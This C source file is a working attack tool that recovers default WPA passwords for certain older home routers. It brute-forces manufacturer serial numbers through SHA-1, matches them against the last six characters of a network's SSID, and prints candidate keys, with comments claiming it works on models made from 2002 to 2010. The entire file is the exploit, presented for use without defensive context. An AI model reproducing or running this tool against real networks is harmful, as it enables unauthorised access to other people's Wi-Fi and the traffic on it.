#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#include <pthread.h>
#include <openssl/sha.h>

#define YEAR_BEGIN_NUM 2 //This "hack" is known to work with models made during the year 2002
#define NUM_OF_YEARS 8  //and work for all models made up to and including 2010. 2 + 8 = 10

const char *ident;

void usage(const char *name)
{
	printf("Usage: %s ssid_identifier\n", name);
}

void sha1_to_str(unsigned char *sha1, char *str)
{
    for (int i = 0; i < 20; i++) 
    {
        sprintf(&str[i * 2], "%02x", sha1[i]);
    }	
}

void str_to_upper(char *str)
{
	for (int i = 0; i < strlen(str); i++)
	{
		str[i] = toupper(str[i]);
	}
}

void *calc_wpa_key(void *arg)
{
	const char chars[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	
	char id[strlen(ident)+1];
	strcpy(id, ident);
	
	int year = *((int *)arg);
	char str[3];
	char serial[13];
	unsigned char sha1_out[20];
	char sha1_out_str[41];
	for (int week = 1; week < 53; week++)
	{
		for (int i = 0; i < 36; i++)
		{
			for (int j = 0; j < 36; j++)
			{
				for (int k = 0; k < 36; k++)
				{
					str[0] = chars[i];
					str[1] = chars[j];
					str[2] = chars[k];
					sprintf(serial, "CP%02d%02d%X%X%X", year, week, str[0], str[1], str[2]);
					SHA1((const unsigned char*)serial, strlen(serial), sha1_out);
					sha1_to_str(sha1_out, sha1_out_str);
					int cmp = strcmp(&sha1_out_str[40] - strlen(id), id);
					if (cmp == 0)
					{
						sha1_out_str[10] = '\0';
						str_to_upper(sha1_out_str);
						printf("Possible Key Found: %s\n", sha1_out_str);
					}
				}
			}
		}
	}
	return NULL;
}

int main(int argc, char *argv[])
{
	char id[7];
	memset(id, '\0', 7);
	while (strlen(id) != 6)
	{
		puts("Enter the last 6 characters of the SSID: ");
		memset(id, '\0', 7);
		scanf("%06s", id);
	}
	for (int i = 0; i < strlen(id); i++)
	{
		id[i] = tolower(id[i]);
	}
	ident = id;
	pthread_t thread[NUM_OF_YEARS];
	int year[NUM_OF_YEARS];
	for (int i = 0; i < NUM_OF_YEARS; i++)
	{
		year[i] = YEAR_BEGIN_NUM + i;
		if(pthread_create(&thread[i], NULL, &calc_wpa_key, &year[i]))
		{
    		printf("Error creating thread\n");
        	return EXIT_FAILURE;
		}
	}
	
	for (int i = 0; i < NUM_OF_YEARS; i++)
	{
		pthread_join(thread[i], NULL);
	}
	
	/* Keep windows users happy */
	char c;
	puts("Press enter to exit...");
	fflush(stdout);
	while((c = getchar()) != '\n' && c != EOF)
		continue;
	getchar();
	return EXIT_SUCCESS;
}
